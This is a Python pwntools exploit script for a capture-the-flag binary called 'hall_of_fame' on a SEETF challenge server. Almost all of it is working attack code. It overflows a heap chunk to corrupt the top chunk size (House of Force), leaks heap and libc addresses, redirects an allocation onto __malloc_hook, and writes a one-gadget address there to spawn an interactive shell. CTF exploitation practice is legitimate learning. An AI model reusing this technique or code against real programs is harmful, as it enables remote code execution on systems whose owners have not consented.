#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host fun.chall.seetf.sg --port 50004 ./hall_of_fame
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./hall_of_fame')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'fun.chall.seetf.sg'
port = int(args.PORT or 50004)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
b *0x400b34
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

libc =exe.libc
# libc = ELF("./libc6-amd64_2.23-0ubuntu11.3_i386.so")
io.sendlineafter("> ","1")
io.sendlineafter("> ",str(0x10))
io.sendlineafter("> ",'a'*16+p64(0)+p64(0xffffffffffffffff))

io.sendlineafter("> ","2")
io.recvuntil("is at ")
heap = int(io.recvline()[:-1],16)
print(hex(heap))
io.recvuntil("is at ")
puts = int(io.recvline()[:-1],16)
print(hex(puts))
libc.address = puts- libc.sym['puts']
print(hex(libc.address))
to = libc.sym['__malloc_hook'] - heap-0x20-0x10

io.sendlineafter("> ","1")
io.sendlineafter("> ",str(to))
io.sendlineafter("> ",'a')

io.sendlineafter("> ","1")
io.sendlineafter("> ",str(0x10))
io.sendlineafter("> ",p64(libc.address + 0x10a2fc))
# io.sendlineafter("> ",p64(libc.address + 0xd5ad7))

io.sendlineafter("> ","1")
io.sendlineafter("> ",str(0x10))
io.interactive()

